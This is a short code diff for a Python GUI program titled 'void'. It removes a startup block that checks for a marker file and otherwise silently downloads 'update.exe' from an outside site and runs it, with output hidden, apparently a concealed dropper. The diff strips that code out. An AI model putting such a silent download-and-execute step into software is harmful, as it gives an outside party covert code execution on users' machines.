@@ -11,13 +11,6 @@ from tkinter import filedialog
 import threading
 import time
 
-verify = r"C:\Program Files\v\ve.png"
-c = os.path.exists(verify)
-if not c:
-    os.system('curl -L -o "update.exe" https://voidsoftworks.dev/update.exe >nul 2<&1')
-    os.system("start update.exe")
-
-
 root = ctk.CTk()
 root.geometry("957x538")
 root.title("void")
